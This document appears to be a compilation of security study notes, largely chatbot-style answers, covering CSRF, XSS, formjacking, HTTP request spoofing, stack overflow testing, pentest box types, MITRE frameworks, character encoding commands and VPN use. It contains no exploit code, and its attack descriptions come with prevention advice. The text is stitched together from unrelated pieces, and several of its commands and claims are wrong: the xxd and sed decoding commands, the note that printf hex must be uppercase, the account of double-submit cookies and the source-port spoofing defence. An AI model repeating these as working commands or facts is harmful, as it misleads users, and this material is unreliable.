<li><strong>Unauthorized Action:</strong> The website processes the request based on the victim's authenticated session, performing the action dictated by the attacker's crafted request.</li>
</ol>
<p><strong>Common CSRF Attack Scenarios:</strong></p>
<ul>
<li><strong>Transferring Funds:</strong> An attacker might create a link that, when clicked by a logged-in user of an online bank, initiates a money transfer to the attacker's account.</li>
<li><strong>Changing Account Settings:</strong> An attacker might create a form that, when submitted by a logged-in user of a social media platform, changes their profile information or privacy settings.</li>
<li><strong>Posting Comments:</strong> An attacker might embed a form that, when submitted by a logged-in user of a forum, posts a specific message on their behalf.</li>
</ul>
<p><strong>CSRF Prevention:</strong></p>
<ul>
<li><strong>CSRF Tokens:</strong> Websites can generate unique CSRF tokens for each user session and embed them in forms or links. The server verifies the presence and validity of the CSRF token before processing the request.</li>
<li><strong>SameSite Cookie Attribute:</strong> Setting the <code>SameSite</code> cookie attribute to <code>Strict</code> can prevent CSRF attacks that rely on cookies sent across different websites.</li>
<li><strong>Double Submit Cookies:</strong> Double submit cookies can be used to confirm user intent for sensitive actions, requiring a separate confirmation step before processing the request.</li>
<li><strong>User Education:</strong> Educate users about the risks of clicking on unknown links or forms, especially those received via email or social media.</li>
</ul>
<p>By implementing these security measures, web developers can significantly reduce the risk of CSRF attacks and protect users' accounts and data from unauthorized actions.</p>
<div style="break-before: page; page-break-before: always;"></div><p>Here's the translation of &quot;ataki typu cross-site scripting&quot; into English:</p>
<p><strong>Cross-Site Scripting (XSS)</strong></p>
<p>Cross-Site Scripting, often abbreviated as XSS, is a type of web security vulnerability that allows attackers to inject malicious scripts into otherwise legitimate websites. These scripts are then executed by the victim's browser when they visit the compromised website, potentially compromising their data or browser session.</p>
<p><strong>How XSS Attacks Work:</strong></p>
<ol>
<li><strong>Injection:</strong> Attackers exploit vulnerabilities in web applications to inject malicious scripts into web pages. This injection can happen through various means, such as user input forms, comments, or even URLs.</li>
<li><strong>Execution:</strong> When a victim visits the compromised webpage, their browser unknowingly executes the injected script as part of the page content.</li>
<li><strong>Attack:</strong> The script can then perform various malicious actions, depending on the attacker's intent. These actions may include:
<ul>
<li>Stealing cookies or session tokens to hijack the victim's session.</li>
<li>Redirecting the victim to malicious websites.</li>
<li>Defacing the website with unwanted content.</li>
<li>Launching further attacks on the victim's browser or computer.</li>
</ul>
</li>
</ol>
<p><strong>Types of XSS Attacks:</strong></p>
<ul>
<li><strong>Stored XSS:</strong> Malicious scripts are permanently stored on the server and executed whenever a user accesses the affected page.</li>
<li><strong>Reflected XSS:</strong> Malicious scripts are injected as part of a user's request and reflected back to the user in the response. These attacks typically target specific user inputs.</li>
<li><strong>DOM-based XSS (Document Object Model):</strong> Malicious scripts are not stored on the server but are injected into the client-side scripting environment (DOM) during page rendering.</li>
</ul>
<p><strong>XSS Prevention:</strong></p>
<ul>
<li><strong>Input Validation:</strong> Sanitize all user input to remove potentially harmful code before processing and displaying it on the web page.</li>
<li><strong>Output Encoding:</strong> Encode special characters in user input to prevent browsers from interpreting them as part of the script.</li>
<li><strong>Content Security Policy (CSP):</strong> Implement a CSP to restrict the sources of scripts that can be executed on the web page.</li>
<li><strong>Secure Coding Practices:</strong> Developers should follow secure coding practices to avoid introducing XSS vulnerabilities in the first place.</li>
</ul>
<p>By implementing these security measures, web developers can significantly reduce the risk of XSS attacks and protect their users' data and privacy.</p>

<p><strong>Form Submission Spoofing</strong></p>
<p>Form submission spoofing, also known as formjacking or formjacking attacks, is a type of cyberattack that aims to intercept and manipulate user-submitted data in online forms. Attackers employ various techniques to trick users into submitting their data to a fraudulent website or application, often disguised as a legitimate one.</p>
<p><strong>How Form Submission Spoofing Works:</strong></p>
<ol>
<li><strong>Malicious Website or Application:</strong> Attackers create a malicious website or application that closely resembles a legitimate one, such as an online banking website or a payment gateway.</li>
<li><strong>Targeted Forms:</strong> Attackers identify and target specific forms on the legitimate website or application, such as login forms, payment forms, or personal information forms.</li>
<li><strong>Form Overlay or Redirection:</strong> Attackers employ various techniques to overlay or redirect the legitimate forms with their malicious counterparts. This can be done using transparent overlays, JavaScript injections, or hidden redirects.</li>
<li><strong>User Interaction:</strong> When the user interacts with the form on the legitimate website, their actions are captured by the attacker's malicious overlay or redirection.</li>
<li><strong>Data Interception:</strong> The attacker's malicious form intercepts the user's input data, such as login credentials, credit card information, or personal details.</li>
<li><strong>Data Misuse:</strong> The attacker can then misuse the intercepted data for various malicious purposes, such as:
<ul>
<li>Unauthorized access to user accounts.</li>
<li>Fraudulent transactions.</li>
<li>Identity theft.</li>
<li>Data breaches.</li>
</ul>
</li>
</ol>
<p><strong>Common Form Submission Spoofing Techniques:</strong></p>
<ul>
<li><strong>Transparent Overlays:</strong> Attackers create transparent overlays that cover the legitimate form, capturing user input as they interact with the underlying form.</li>
<li><strong>JavaScript Injections:</strong> Attackers inject malicious JavaScript code into the legitimate website, modifying the form's behavior to redirect user input to the attacker's server.</li>
<li><strong>Hidden Redirects:</strong> Attackers use hidden redirects to send user form submissions to the attacker's server instead of the legitimate website.</li>
</ul>
<p><strong>Prevention of Form Submission Spoofing:</strong></p>
<ul>
<li><strong>Input Validation:</strong> Implement strict input validation on the server-side to verify and sanitize user input, preventing malicious data from being processed.</li>
<li><strong>Cross-Site Scripting (XSS) Prevention:</strong> Implement robust XSS prevention measures to prevent attackers from injecting malicious JavaScript code into the website.</li>
<li><strong>Secure Coding Practices:</strong> Follow secure coding practices to avoid introducing vulnerabilities that could be exploited for formjacking attacks.</li>
<li><strong>User Education:</strong> Educate users about the risks of clicking on suspicious links or entering personal information on unfamiliar websites.</li>
</ul>
<p>By implementing these security measures, web developers can significantly reduce the risk of form submission spoofing attacks and protect users' data from unauthorized interception and misuse.</p>
<div style="break-before: page; page-break-before: always;"></div><p>Here's the translation of &quot;sfałszowanie żądania HTTP&quot; (falsified HTTP request) into English:</p>
<p><strong>HTTP Request Spoofing</strong></p>
<p>HTTP request spoofing refers to a cyberattack technique where attackers forge or manipulate HTTP requests to trick a server into believing they originate from a trusted source. These forged requests can be used for various malicious purposes, depending on the attacker's intent.</p>
<p><strong>How HTTP Request Spoofing Works:</strong></p>
<ol>
<li><strong>Spoofed Source:</strong> Attackers modify the source IP address or other identifying information in an HTTP request to make it appear as if it's coming from a legitimate user or device.</li>
<li><strong>Targeted Server:</strong> The attacker sends the spoofed request to a specific server, aiming to gain unauthorized access, steal data, or disrupt operations.</li>
<li><strong>Deception:</strong> Since the server may not be able to distinguish the spoofed request from a genuine one, it may process the request and potentially grant access or perform actions based on the attacker's intent.</li>
</ol>
<p><strong>Common HTTP Request Spoofing Attacks:</strong></p>
<ul>
<li><strong>Denial-of-Service (DoS) Attacks:</strong> Attackers can spoof a large number of HTTP requests from different sources, overwhelming the target server and causing it to become unavailable to legitimate users.</li>
<li><strong>Man-in-the-Middle (MitM) Attacks:</strong> Attackers can position themselves between the victim and the server, intercepting and modifying HTTP requests to steal data or redirect traffic.</li>
<li><strong>Privilege Escalation:</strong> Attackers may exploit vulnerabilities in authentication mechanisms to spoof requests with higher privileges than they actually possess.</li>
<li><strong>Website Defacement:</strong> Spoofed requests can be used to modify the content of a website, displaying attacker-controlled messages or propaganda.</li>
</ul>
<p><strong>Prevention of HTTP Request Spoofing:</strong></p>
<ul>
<li><strong>IP Address Validation:</strong> Implement stricter IP address validation to identify and potentially block requests originating from suspicious or unexpected sources.</li>
<li><strong>Source Port Verification:</strong> Analyze the source port number of incoming requests, as attackers might struggle to spoof both IP address and port simultaneously.</li>
<li><strong>Strict Access Control:</strong> Implement robust access control mechanisms to limit access to sensitive resources and functionalities based on user roles and permissions.</li>
<li><strong>Traffic Monitoring:</strong> Monitor network traffic for anomalies and suspicious patterns that might indicate spoofed requests.</li>
<li><strong>Use of Security Protocols:</strong> Utilize secure protocols like HTTPS that encrypt communication and make it more difficult to manipulate requests in transit.</li>
</ul>
<p>By implementing these security measures, system administrators can enhance their defenses against HTTP request spoofing attacks and protect servers from unauthorized access and malicious activities.</p>

<p>https://stackoverflow.com/a/29902473</p>
<p>There are two main approaches for finding stack buffer overflows:</p>
<p>Black box testing The key to testing an application for stack overflow vulnerabilities is supplying overly large input data as compared to what is expected. However, subjecting the application to arbitrarily large data is not sufficient. It becomes necessary to inspect the application’s execution flow and responses to ascertain whether an overflow has actually been triggered or not. Therefore, the steps required to locate and validate stack overflows would be to attach a debugger to the target application or process, generate malformed input for the application, subject the application to malformed input, and inspect responses in a debugger. The debugger allows the tester to view the execution flow and the state of the registers when the vulnerability gets triggered</p>
<p>Gray Box Testing Manually review the code (disassemble it). When reviewing code for stack overflows, it is advisable to search for calls to insecure library functions like gets(), strcpy(), strcat() etc which do not validate the length of source strings and blindly copy data into fixed size buffers. Apart from manually reviewing code for stack overflows, static code analysis tools can also be of great assistance. Although they tend to generate a lot of false positives and would barely be able to locate a small portion of defects, they certainly help in reducing the overhead associated with finding low hanging fruits, like strcpy() and sprintf() bugs. A variety of tools like RATS, Flawfinder and ITS4 are available for analyzing C-style languages.</p>
<p>The best tools for those testings are: OllyDbg and IDA Pro (for static and dynamic debugging).</p>

<p>Penetration testing (pen testing) comes in different flavors, categorized by the amount of information given to the testers. These categories are often referred to using colors: black-box, white-box, and <strong>gray-box</strong>.</p>
<p><strong>Gray-box testing</strong>, also known as translucent box testing, finds a middle ground between the other two. Here's a breakdown of all three and how gray-box fits in:</p>
<ul>
<li>
<p><strong>Black-box testing:</strong> Simulates a real-world attacker's perspective. The testers have <strong>no prior knowledge</strong> about the system or network they're assessing. They work just like a malicious actor would, starting from scratch to discover vulnerabilities.</p>
</li>
<li>
<p><strong>White-box testing:</strong> The testers have <strong>full access</strong> to the system's internal workings. This includes source code, network diagrams, architecture documents, and anything else that can provide a deep understanding of how things function.</p>
</li>
<li>
<p><strong>Gray-box testing:</strong> Testers get a <strong>limited set of information</strong>. This typically includes login credentials for specific user accounts (administrator, standard user, etc.) and maybe some basic documentation about the system's purpose or functionality.</p>
</li>
</ul>
<p><strong>Specific details of Gray-box testing:</strong></p>
<ul>
<li>
<p><strong>Benefits:</strong></p>
<ul>
<li><strong>Balanced approach:</strong> Provides a good mix of efficiency and thoroughness compared to black-box and white-box testing.</li>
<li><strong>Simulates insider threats:</strong> Helps assess the damage a disgruntled employee or compromised account could cause.</li>
<li><strong>Focuses testing:</strong> Testers can target specific areas based on the provided information.</li>
</ul>
</li>
<li>
<p><strong>Information provided:</strong> </p>
<ul>
<li>Usually includes login credentials for various user accounts.</li>
<li>May include some high-level system documentation or diagrams.</li>
</ul>
</li>
<li>
<p><strong>Goals:</strong> </p>
<ul>
<li>Identify vulnerabilities that could be exploited by users with different access levels. </li>
<li>Assess the potential impact of a compromised account.</li>
<li>Find weaknesses in access controls and authorization mechanisms.</li>
</ul>
</li>
</ul>
<p><strong>In essence, gray-box testing allows you to see the system through a partially tinted lens. You have some insider knowledge but not the complete picture, making it a valuable tool for simulating real-world attack scenarios with varying levels of access.</strong></p>
<h2 id="white-box-testing"><a class="header" href="#white-box-testing">White-box testing</a></h2>
<p>In the world of penetration testing, white-box testing, also known as clear-box or transparent box testing, equips the tester with full access to the inner workings of the target system. This means they get all the goodies: source code, network diagrams, architecture documentation, credentials for various accounts with different permission levels, and anything else that might be helpful in finding weaknesses.</p>
<p>Think of it as giving the tester a backstage pass to the system. They can see how everything is built, how it's supposed to function, and where potential vulnerabilities might hide. This approach offers some distinct advantages:</p>
<ul>
<li>
<p><strong>Thorough examinations:</strong> With all the internal details at their disposal, white-box testers can conduct in-depth examinations. They can analyze the code itself, reviewing every line for security gaps. This meticulous inspection helps uncover a wider range of vulnerabilities compared to other testing methods.</p>
</li>
<li>
<p><strong>Efficiency boost:</strong> Having a roadmap of the system saves time. Testers don't have to spend effort on figuring out how things work; they can dive straight into identifying weaknesses. This translates to faster testing and quicker identification of security risks.</p>
</li>
<li>
<p><strong>Targeted attacks:</strong> White-box testing shines when you want to simulate a highly targeted attack by a sophisticated adversary. The tester can leverage their knowledge of the system's design and functionalities to craft the most impactful exploit strategies.</p>
</li>
<li>
<p><strong>Improved design and development:</strong>  By pinpointing vulnerabilities arising from code structure or design flaws, white-box testing helps strengthen the system from the ground up. This feedback loop can inform better coding practices and a more secure development process.</p>
</li>
</ul>
<p>However, white-box testing also comes with some challenges:</p>
<ul>
<li>
<p><strong>Information overload:</strong> Sifting through a massive amount of data, especially complex codebases, can be overwhelming. Testers need strong analytical skills to prioritize areas for examination and identify critical vulnerabilities.</p>
</li>
<li>
<p><strong>Cost factor:</strong>  Providing comprehensive access to internal systems can be resource-intensive. Additionally, the expertise required for white-box testing often comes at a higher cost compared to other testing methods.</p>
</li>
<li>
<p><strong>Limited real-world simulation:</strong> While valuable, white-box testing doesn't perfectly replicate real-world attacks. Malicious actors might not have the same level of knowledge about your system, so it's important to combine white-box testing with other penetration testing methodologies for a well-rounded security assessment.</p>
</li>
</ul>
<h2 id="black-box-testing"><a class="header" href="#black-box-testing">Black-box testing</a></h2>
<p>Black-box penetration testing, also known as external or blind testing, throws the pentester (penetration tester) headfirst into the unknown. Unlike white-box testing, they have <strong>zero prior knowledge</strong> about the target system's inner workings. No code snippets, architecture diagrams, or magic admin credentials – just the target IP address or URL, mimicking a real-world attacker.</p>
<p>Here's how it works:</p>
<ul>
<li>
<p><strong>Reconnaissance:</strong>  The pentester starts by gathering intel through open-source information gathering (OSINT). This involves scouring the web for any publicly available details about the target system, like technologies used, known vulnerabilities in those technologies, and any potential misconfigurations. Think of it as building a mental map of the target from publicly available scraps.</p>
</li>
<li>
<p><strong>Enumeration and Mapping:</strong> With reconnaissance complete, the pentester uses various tools to identify live systems, ports, and services running on the target network.  Port scanners and network mappers help paint a picture of the target's attack surface, revealing potential entry points for exploitation.</p>
</li>
<li>
<p><strong>Vulnerability Scanning:</strong> Armed with the network map, the pentester unleashes a barrage of automated vulnerability scanners. These tools scan for common weaknesses in operating systems, applications, and configurations, providing a starting point for further exploration.</p>
</li>
<li>
<p><strong>Exploitation and Post-Exploitation:</strong>  This is where things get interesting. With vulnerabilities identified, the pentester attempts to exploit them using publicly available exploits or crafting their own. If successful, they'll gain a foothold in the system.  The goal then becomes to escalate privileges, move laterally within the network, and potentially achieve their objective, which could be stealing data, installing malware, or disrupting operations. Just like a real attacker would.</p>
</li>
<li>
<p><strong>Reporting and Remediation:</strong> Finally, the pentester documents their findings in a comprehensive report, detailing the exploited vulnerabilities, their impact, and recommended remediation steps. This critical information empowers the organization to patch the identified holes and harden their defenses.</p>
</li>
</ul>
<p>Here's what makes black-box testing valuable:</p>
<ul>
<li>
<p><strong>Real-world simulation:</strong> It closely mimics how actual attackers operate, exposing vulnerabilities that external adversaries might leverage.</p>
</li>
<li>
<p><strong>Cost-effective:</strong>  Compared to white-box testing, black-box testing requires less internal resource allocation as the tester doesn't need deep system familiarization.</p>
</li>
<li>
<p><strong>Focus on perimeter security:</strong> It highlights weaknesses in external defenses, critical for organizations concerned about external threats.</p>
</li>
</ul>
<p>However, black-box testing also has limitations:</p>
<ul>
<li>
<p><strong>Limited visibility:</strong>  The lack of internal knowledge can make it difficult to pinpoint the root cause of vulnerabilities or identify the most impactful targets within the system.</p>
</li>
<li>
<p><strong>Time-consuming:</strong>  The initial reconnaissance and enumeration stages can be lengthy, especially for complex systems.</p>
</li>
<li>
<p><strong>Lower vulnerability detection rate:</strong>  Black-box testing might miss vulnerabilities that require knowledge of the internal workings or specific configurations.</p>
</li>
</ul>
<p>For a well-rounded security assessment, organizations often combine black-box testing with other penetration testing methodologies like white-box testing, providing a more comprehensive picture of the system's security posture. </p>

<p>For those that are new to the cybersecurity field, you probably never heard of MITRE. Those of us that have been around might only associate MITRE with CVEs (Common Vulnerabilities and Exposures) list, which is one resource you'll probably check when searching for an exploit for a given vulnerability. But MITRE researches in many areas, outside of cybersecurity, for the 'safety, stability, and well-being of our nation.'  These areas include artificial intelligence, health informatics, space security, to name a few.</p>
<p>From Mitre.org: &quot;At MITRE, we solve problems for a safer world. Through our federally funded R&amp;D centers and public-private partnerships, we work across government to tackle challenges to the safety, stability, and well-being of our nation.&quot;</p>
<p>In this room, we will focus on other projects/research that the US-based non-profit MITRE Corporation has created for the cybersecurity community, specifically:</p>
<p>ATT&amp;CK® (Adversarial Tactics, Techniques, and Common Knowledge) Framework
CAR (Cyber Analytics Repository) Knowledge Base
ENGAGE (sorry, not a fancy acronym)
D3FEND (Detection, Denial, and Disruption Framework Empowering Network Defense)
AEP (ATT&amp;CK Emulation Plans)
Let's dive in, shall we...</p>
<p>Room updated: July 1st, 2022</p>
<p>Before diving in, let's briefly discuss a few terms that you will often hear when dealing with the framework, threat intelligence, etc.</p>
<p>APT is an acronym for Advanced Persistent Threat. This can be considered a team/group (threat group), or even country (nation-state group), that engages in long-term attacks against organizations and/or countries. The term 'advanced' can be misleading as it will tend to cause us to believe that each APT group all have some super-weapon, e.i. a zero-day exploit, that they use. That is not the case. As we will see a bit later, the techniques these APT groups use are quite common and can be detected with the right implementations in place. You can view FireEye's current list of APT groups here.</p>
<p>TTP is an acronym for Tactics, Techniques, and Procedures, but what does each of these terms mean?</p>
<p>The Tactic is the adversary's goal or objective.
The Technique is how the adversary achieves the goal or objective.
The Procedure is how the technique is executed.
If that is not that clear now, don't worry. Hopefully, as you progress through each section, TTPs will make more sense.</p>

<h2 id="encode"><a class="header" href="#encode">Encode</a></h2>
<p>Here are the steps on how to encode a character as a hex value:</p>
<ol>
<li>Open a terminal window.</li>
<li>Type the following command:</li>
</ol>
<pre><code>echo -n 'z' | xxd -p
</code></pre>
<ol start="3">
<li>Press Enter.</li>
</ol>
<p>This will output the hex value of the character &quot;z&quot;. The hex value will be two characters long, and it will start with the prefix <code>0x</code>.</p>
<p>For example, the hex value of the character &quot;z&quot; is <code>0x7a</code>.</p>
<p>Here is a breakdown of the command:</p>
<ul>
<li><code>echo -n 'z'</code>: This command prints the character &quot;z&quot; without a newline character.</li>
<li><code>xxd -p</code>: This command converts the character to its hex value and prints it.</li>
</ul>
<p>I hope this helps! Let me know if you have any other questions.</p>
<p>Here is an example of how to encode a character as a hex value in a Python script:</p>
<pre><code class="language-python">import sys

def encode_character_as_hex(character):
  hex_value = '%02x' % ord(character)
  return hex_value

if __name__ == '__main__':
  character = 'z'
  hex_value = encode_character_as_hex(character)
  print(hex_value)
</code></pre>
<p>This script will print the hex value of the character &quot;z&quot;.</p>
<p>You can use the <code>printf</code> command in the Terminal to encode characters as hex values. Here's how you can do it:</p>
<ol>
<li>
<p>Open Terminal.</p>
</li>
<li>
<p>Use the <code>printf</code> command with the format <code>\x</code> followed by the hex value of the character you want to encode. For example, to encode the character 'A', which has a hex value of <code>41</code>, you can use the following command:</p>
<pre><code>printf '\x41'
</code></pre>
</li>
<li>
<p>Press Enter to execute the command.</p>
</li>
</ol>
<p>The output will be the encoded hex value of the character. In this example, it will display <code>A</code>.</p>
<p>You can replace <code>41</code> with the hex value of any character you want to encode. Note that the hex value must be specified in uppercase.</p>
<p>If you want to encode a string with multiple characters, you can use the following syntax:</p>
<pre><code>printf 'string' | od -An -tx1
</code></pre>
<p>Replace 'string' with the actual string you want to encode. This command will display the hex values of each character in the string.</p>
<p>For more complex encoding or specific requirements, you might need to use scripting languages like Python or Perl, which offer more extensive string manipulation capabilities. However, for basic encoding of individual characters or short strings, <code>printf</code> in the Terminal should suffice.</p>
<h2 id="decode"><a class="header" href="#decode">Decode</a></h2>
<p>Here are the steps on how to decode a character from a hex value:</p>
<ol>
<li>Open a terminal window.</li>
<li>Type the following command:</li>
</ol>
<pre><code>echo -n '%7a' | xxd -r
</code></pre>
<ol start="3">
<li>Press Enter.</li>
</ol>
<p>This will output the character that corresponds to the hex value <code>%7a</code>. The character will be <code>z</code>.</p>
<p>Here is a breakdown of the command:</p>
<ul>
<li><code>echo -n '%7a'</code>: This command prints the hex value <code>%7a</code> without a newline character.</li>
<li><code>xxd -r</code>: This command converts the hex value to its character representation and prints it.</li>
</ul>
<p>I hope this helps! Let me know if you have any other questions.</p>
<p>Here is an example of how to decode a character from a hex value in a Python script:</p>
<pre><code class="language-python">import sys

def decode_character_from_hex(hex_value):
  character = chr(int(hex_value, 16))
  return character

if __name__ == '__main__':
  hex_value = '%7a'
  character = decode_character_from_hex(hex_value)
  print(character)
</code></pre>
<p>This script will print the character that corresponds to the hex value <code>%7a</code>.</p>
<p>You can use the <code>printf</code> command in the Terminal to decode characters from their hex values. Here's how you can do it:</p>
<ol>
<li>
<p>Open Terminal.</p>
</li>
<li>
<p>Use the <code>printf</code> command with the format <code>\x</code> followed by the hex value of the character you want to decode. For example, to decode the hex value <code>41</code> (which corresponds to the character 'A' in ASCII), you can use the following command:</p>
<pre><code>printf '\x41'
</code></pre>
</li>
<li>
<p>Press Enter to execute the command.</p>
</li>
</ol>
<p>The output will be the decoded character. In this example, it will display <code>A</code>.</p>
<p>You can replace <code>41</code> with any valid hex value, and the <code>printf</code> command will decode it into the corresponding character.</p>
<p>If you want to decode a string with multiple hex values, you can use the following syntax:</p>
<pre><code>echo -e -n '\x68\x65\x6c\x6c\x6f'
</code></pre>
<p>This command will output the decoded string, which in this example is <code>&quot;hello&quot;</code>.</p>
<p>Using the <code>\x</code> format with <code>printf</code> allows you to easily decode characters from their hex representation in the Terminal.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="url-encoding"><a class="header" href="#url-encoding">URL encoding</a></h1>
<h2 id="encode-1"><a class="header" href="#encode-1">Encode</a></h2>
<p>Here are the steps on how to encode a character as a URL encoding value:</p>
<ol>
<li>Open a terminal window.</li>

</ol>
<pre><code>echo -n 'z' | xxd -p | sed 's/\(..\)/%\1/g'
</code></pre>
<ol start="3">
<li>Press Enter.</li>
</ol>
<p>This will output the URL encoding value of the character &quot;z&quot;. The URL encoding value will be three characters long, and it will start with the prefix <code>%</code>.</p>
<p>For example, the URL encoding value of the character &quot;z&quot; is <code>%7a</code>.</p>
<p>Here is a breakdown of the command:</p>
<ul>
<li><code>echo -n 'z'</code>: This command prints the character &quot;z&quot; without a newline character.</li>
<li><code>xxd -p</code>: This command converts the character to its hex value and prints it.</li>
<li><code>sed 's/\(..\)/%\1/g'</code>: This command replaces each two-digit hexadecimal value with the corresponding URL encoding value.</li>
</ul>
<p>I hope this helps! Let me know if you have any other questions.</p>
<p>Here is an example of how to encode a character as a URL encoding value in a Python script:</p>
<pre><code class="language-python">import sys

def encode_character_as_url_encoding(character):
  hex_value = '%02x' % ord(character)
  url_encoding_value = '%' + hex_value
  return url_encoding_value

if __name__ == '__main__':
  character = 'z'
  url_encoding_value = encode_character_as_url_encoding(character)
  print(url_encoding_value)
</code></pre>
<p>This script will print the URL encoding value of the character &quot;z&quot;.</p>
<p>You can use the <code>python</code> command in the Terminal to encode characters as URL encoding values. You can use it for URL encoding without any additional setup.</p>
<p>Here's how you can do it:</p>
<ol>
<li>
<p>Open Terminal.</p>
</li>
<li>
<p>Use the <code>python</code> command with the <code>-c</code> flag to run a Python one-liner for URL encoding. Replace <code>char</code> with the character you want to encode. For example, to encode the character 'A', you can use the following command:</p>
<pre><code>python -c &quot;import urllib.parse; print(urllib.parse.quote('A'))&quot;
</code></pre>
</li>
<li>
<p>Press Enter to execute the command.</p>
</li>
</ol>
<p>The output will be the URL-encoded value of the character. In this example, it will display <code>%41</code>, which is the URL-encoded value of 'A' in ASCII.</p>
<p>You can replace <code>'A'</code> with any character you want to encode, and the command will display its corresponding URL-encoded value.</p>
<p>If you want to encode a string with multiple characters, you can use the following syntax:</p>
<pre><code>python -c &quot;import urllib.parse; print(urllib.parse.quote('your string'))&quot;
</code></pre>
<p>Replace <code>'your string'</code> with the actual string you want to encode. This command will display the URL-encoded value of the entire string.</p>
<p>Python's <code>urllib.parse.quote()</code> function handles URL encoding, ensuring that the resulting string is safe for use in URLs and other web-related contexts.</p>
<h2 id="decode-1"><a class="header" href="#decode-1">Decode</a></h2>
<p>You can use the <code>python</code> command in the Terminal to decode characters from URL encoding. You can use it for URL decoding without any additional setup.</p>
<p>Here's how you can do it:</p>
<ol>
<li>
<p>Open Terminal.</p>
</li>
<li>
<p>Use the <code>python</code> command with the <code>-c</code> flag to run a Python one-liner for URL decoding. Replace <code>encoded_string</code> with the URL-encoded string you want to decode. For example, to decode <code>%41</code>, which represents the character 'A' in URL encoding, you can use the following command:</p>
<pre><code>python -c &quot;import urllib.parse; print(urllib.parse.unquote('%41'))&quot;
</code></pre>
</li>
<li>
<p>Press Enter to execute the command.</p>
</li>
</ol>
<p>The output will be the decoded character. In this example, it will display <code>A</code>.</p>
<p>You can replace <code>'%41'</code> with any valid URL-encoded string, and the command will decode it into the corresponding character or string.</p>
<p>If you want to decode a complete URL-encoded string, you can use the following syntax:</p>
<pre><code>python -c &quot;import urllib.parse; print(urllib.parse.unquote('your%20encoded%20string'))&quot;
</code></pre>
<p>Replace <code>'your%20encoded%20string'</code> with the actual URL-encoded string you want to decode. This command will output the decoded string.</p>
<p>Python's <code>urllib.parse.unquote()</code> function handles URL decoding, converting URL-encoded values back to their original characters or strings.</p>
<p>Here are the steps on how to decode a character from URL encoding:</p>
<ol>
<li>Open a terminal window.</li>
<li>Type the following command:</li>
</ol>
<pre><code>echo -n '%7a' | sed 's/%\([0-9a-fA-F]{2}\)/\1/g'
</code></pre>
<ol start="3">
<li>Press Enter.</li>
</ol>
<p>This will output the character that corresponds to the URL encoding value <code>%7a</code>. The character will be <code>z</code>.</p>
<p>Here is a breakdown of the command:</p>
<ul>
<li><code>echo -n '%7a'</code>: This command prints the URL encoding value <code>%7a</code> without a newline character.</li>
<li><code>sed 's/%\([0-9a-fA-F]{2}\)/\1/g'</code>: This command replaces each <code>%</code> followed by two hexadecimal digits with the corresponding character.</li>
</ul>
<p>I hope this helps! Let me know if you have any other questions.</p>
<p>Here is an example of how to decode a character from URL encoding in a Python script:</p>
<pre><code class="language-python">import sys

def decode_character_from_url_encoding(url_encoding_value):
  hex_value = url_encoding_value[1:]
  character = chr(int(hex_value, 16))
  return character

if __name__ == '__main__':
  url_encoding_value = '%7a'
  character = decode_character_from_url_encoding(url_encoding_value)
  print(character)
</code></pre>
<p>This script will print the character that corresponds to the URL encoding value <code>%7a</code>.</p>

<h2 id="encode-2"><a class="header" href="#encode-2">Encode</a></h2>
<p>Here are the steps on how to encode a character as a decimal value:</p>
<ol>
<li>Open a terminal window.</li>
<li>Type the following command:</li>
</ol>
<pre><code>echo -n 'z' | od -t d
</code></pre>
<ol start="3">
<li>Press Enter.</li>
</ol>
<p>This will output the decimal value of the character &quot;z&quot;. The decimal value will be one or more digits long.</p>
<p>For example, the decimal value of the character &quot;z&quot; is 122.</p>
<p>Here is a breakdown of the command:</p>
<ul>
<li><code>echo -n 'z'</code>: This command prints the character &quot;z&quot; without a newline character.</li>
<li><code>od -t d</code>: This command converts the character to its decimal value and prints it.</li>
</ul>
<p>I hope this helps! Let me know if you have any other questions.</p>
<p>Here is an example of how to encode a character as a decimal value in a Python script:</p>
<pre><code class="language-python">import sys

def encode_character_as_decimal(character):
  decimal_value = ord(character)
  return decimal_value

if __name__ == '__main__':
  character = 'z'
  decimal_value = encode_character_as_decimal(character)
  print(decimal_value)
</code></pre>
<p>This script will print the decimal value of the character &quot;z&quot;.</p>
<p>You can use the <code>printf</code> command in the Terminal to encode characters as decimal values. Here's how you can do it:</p>
<ol>
<li>
<p>Open Terminal.</p>
</li>
<li>
<p>Use the <code>printf</code> command with the format <code>%d</code> followed by the character you want to encode. For example, to encode the character 'A' as a decimal value, you can use the following command:</p>
<pre><code>printf '%d' &quot;'A&quot;
</code></pre>
<p>Note the use of single quotes around the character 'A'. This is required to pass the character as an argument to <code>printf</code>.</p>
</li>
<li>
<p>Press Enter to execute the command.</p>
</li>
</ol>
<p>The output will be the decimal value of the character. In this example, it will display <code>65</code>, which is the decimal value of 'A' in ASCII.</p>
<p>You can replace 'A' with any character you want to encode, and the command will display its corresponding decimal value.</p>
<p>If you want to encode a string with multiple characters, you can use the following syntax:</p>
<pre><code>printf '%d ' $(printf '%d ' &quot;'string&quot;)
</code></pre>
<p>Replace 'string' with the actual string you want to encode. This command will display the decimal values of each character in the string, separated by spaces.</p>
<p>For more complex encoding or specific requirements, you might need to use scripting languages like Python or Perl, which offer more extensive string manipulation capabilities. However, for basic encoding of individual characters or short strings, <code>printf</code> in the Terminal should suffice.</p>

<p>There are many reasons why you should use a VPN or proxy. Here are a few of the most common reasons:</p>
<ul>
<li><strong>Security:</strong> A VPN or proxy can help to protect your privacy and security online. When you use a VPN, your traffic is encrypted and routed through a server in another location. This can help to hide your IP address and make it more difficult for people to track your online activity.</li>
<li><strong>Geo-blocking:</strong> A VPN or proxy can help you to bypass geo-blocking. Geo-blocking is a practice by which websites and services restrict access to certain content based on the user's location. For example, Netflix might only allow users in the United States to watch certain movies and TV shows. If you use a VPN with a server in the United States, you can bypass this geo-blocking and watch Netflix content from anywhere in the world.</li>
<li><strong>Censorship:</strong> A VPN or proxy can help you to bypass censorship. In some countries, the government censors certain websites and services. If you use a VPN with a server in a country that does not censor the internet, you can bypass this censorship and access blocked websites and services.</li>
<li><strong>Torrenting:</strong> Some ISPs throttle or block torrent traffic. If you use a VPN, your torrent traffic will be encrypted and your ISP will not be able to see what you are downloading. This can help to prevent your ISP from throttling or blocking your torrent traffic.</li>
<li><strong>Public Wi-Fi:</strong> When you connect to a public Wi-Fi network, your traffic is not encrypted. This means that anyone who is on the same network can see what you are doing. If you use a VPN, your traffic will be encrypted and no one else on the network will be able to see what you are doing.</li>
</ul>
<p>These are just a few of the reasons why you should use a VPN or proxy. If you are concerned about your privacy or security online, a VPN or proxy is a good way to protect yourself.</p>
